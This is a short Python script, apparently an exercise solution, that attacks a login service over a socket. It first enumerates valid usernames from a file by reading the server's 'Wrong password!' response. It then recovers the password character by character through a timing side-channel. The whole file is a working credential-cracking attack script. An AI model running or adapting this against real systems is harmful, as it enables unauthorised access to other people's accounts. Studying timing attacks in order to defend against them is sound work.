import sys
import socket
import json
import string
import time

# Host and port from arguments
host = sys.argv[1]
port = int(sys.argv[2])

# All possible characters in password
chars = string.ascii_letters + string.digits

# Load login candidates
with open("logins.txt") as f:
    logins = [line.strip() for line in f]

# Create a single socket connection
with socket.socket() as client:
    client.connect((host, port))

    # STEP 1: Find correct login
    correct_login = None
    for login in logins:
        message = json.dumps({"login": login, "password": " "})
        client.send(message.encode())
        response = client.recv(1024).decode()
        result = json.loads(response)["result"]
        if result == "Wrong password!":
            correct_login = login
            break

    # STEP 2: Find password using timing attack
    password = ""
    while True:
        longest_time = 0
        next_char = ""
        for ch in chars:
            attempt = password + ch
            message = json.dumps({"login": correct_login, "password": attempt})
            start = time.perf_counter()
            client.send(message.encode())
            response = client.recv(1024).decode()
            elapsed = time.perf_counter() - start

            result = json.loads(response)["result"]

            if result == "Connection success!":
                print(json.dumps({"login": correct_login, "password": attempt}))
                exit()

            if elapsed > longest_time:
                longest_time = elapsed
                next_char = ch

        password += next_char
